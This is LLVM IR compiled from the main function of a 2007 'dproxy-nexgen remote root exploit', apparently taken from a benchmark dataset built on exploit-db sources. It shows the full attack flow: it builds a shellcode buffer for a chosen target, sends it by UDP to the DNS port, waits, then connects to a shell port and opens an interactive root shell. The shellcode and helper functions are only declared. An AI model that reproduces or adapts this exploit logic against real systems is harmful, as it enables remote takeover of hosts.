; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86/remote/extr_3615.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86/remote/extr_3615.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.target_t = type { i32, i64 }

@BUF_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [112 x i8] c"dproxy-nexgen remote root exploit\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2007!@$!\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [27 x i8] c"Usage: %s <host> <target>\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@NUM_TARGETS = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [25 x i8] c"Only %d targets known!!\0A\00", align 1
@targets = common dso_local global %struct.target_t* null, align 8
@.str.3 = private unnamed_addr constant [21 x i8] c"+Attacking to %s...\0A\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"fp: 0x%x\0A\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"buf len: %d\0A\00", align 1
@.str.6 = private unnamed_addr constant [35 x i8] c"+Building buffer with shellcode...\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"  done\0A\00", align 1
@.str.8 = private unnamed_addr constant [20 x i8] c"+Sending Payload...\00", align 1
@PORT_DNS = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [46 x i8] c"+Waiting for the shellcode to be executed...\0A\00", align 1
@PORT_SHELL = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [10 x i8] c"+Wh00t!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca %struct.target_t*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = load i32, i32* @BUF_SIZE, align 4
  %11 = zext i32 %10 to i64
  %12 = call i8* @llvm.stacksave()
  store i8* %12, i8** %7, align 8
  %13 = alloca i32, i64 %11, align 16
  store i64 %11, i64* %8, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp sle i32 %15, 2
  br i1 %16, label %17, label %25

17:                                               ; preds = %2
  %18 = load i32, i32* @stderr, align 4
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i32, i8*, ...) @fprintf(i32 %18, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i8* %21)
  %23 = load i32, i32* @EXIT_SUCCESS, align 4
  %24 = call i32 @exit(i32 %23) #4
  unreachable

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 2
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @atoi(i8* %28)
  %30 = load i32, i32* @NUM_TARGETS, align 4
  %31 = sext i32 %30 to i64
  %32 = icmp uge i64 %29, %31
  br i1 %32, label %33, label %39

33:                                               ; preds = %25
  %34 = load i32, i32* @stderr, align 4
  %35 = load i32, i32* @NUM_TARGETS, align 4
  %36 = call i32 (i32, i8*, ...) @fprintf(i32 %34, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0), i32 %35)
  %37 = load i32, i32* @EXIT_SUCCESS, align 4
  %38 = call i32 @exit(i32 %37) #4
  unreachable

39:                                               ; preds = %25
  %40 = load %struct.target_t*, %struct.target_t** @targets, align 8
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 2
  %43 = load i8*, i8** %42, align 8
  %44 = call i64 @atoi(i8* %43)
  %45 = getelementptr inbounds %struct.target_t, %struct.target_t* %40, i64 %44
  store %struct.target_t* %45, %struct.target_t** %9, align 8
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 1
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0), i8* %48)
  %50 = load %struct.target_t*, %struct.target_t** %9, align 8
  %51 = getelementptr inbounds %struct.target_t, %struct.target_t* %50, i32 0, i32 1
  %52 = load i64, i64* %51, align 8
  %53 = trunc i64 %52 to i32
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i32 %53)
  %55 = load %struct.target_t*, %struct.target_t** %9, align 8
  %56 = getelementptr inbounds %struct.target_t, %struct.target_t* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 8
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0), i32 %57)
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.6, i64 0, i64 0))
  %60 = mul nuw i64 4, %11
  %61 = trunc i64 %60 to i32
  %62 = call i32 @memset(i32* %13, i32 0, i32 %61)
  %63 = load %struct.target_t*, %struct.target_t** %9, align 8
  %64 = call i32 @zbuffami(i32* %13, %struct.target_t* %63)
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.8, i64 0, i64 0))
  %67 = load i8**, i8*** %5, align 8
  %68 = getelementptr inbounds i8*, i8** %67, i64 1
  %69 = load i8*, i8** %68, align 8
  %70 = load i32, i32* @PORT_DNS, align 4
  %71 = load i32, i32* @BUF_SIZE, align 4
  %72 = call i32 @sock_send_udp(i8* %69, i32 %70, i32* %13, i32 %71)
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.9, i64 0, i64 0))
  %75 = call i32 @sleep(i32 1)
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 1
  %78 = load i8*, i8** %77, align 8
  %79 = load i32, i32* @PORT_SHELL, align 4
  %80 = call i32 @sockami(i8* %78, i32 %79)
  store i32 %80, i32* %6, align 4
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0))
  %82 = load i32, i32* %6, align 4
  %83 = call i32 @shellami(i32 %82)
  %84 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %84, i32* %3, align 4
  %85 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %85)
  %86 = load i32, i32* %3, align 4
  ret i32 %86
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @memset(i32*, i32, i32) #2

declare dso_local i32 @zbuffami(i32*, %struct.target_t*) #2

declare dso_local i32 @sock_send_udp(i8*, i32, i32*, i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @sockami(i8*, i32) #2

declare dso_local i32 @shellami(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
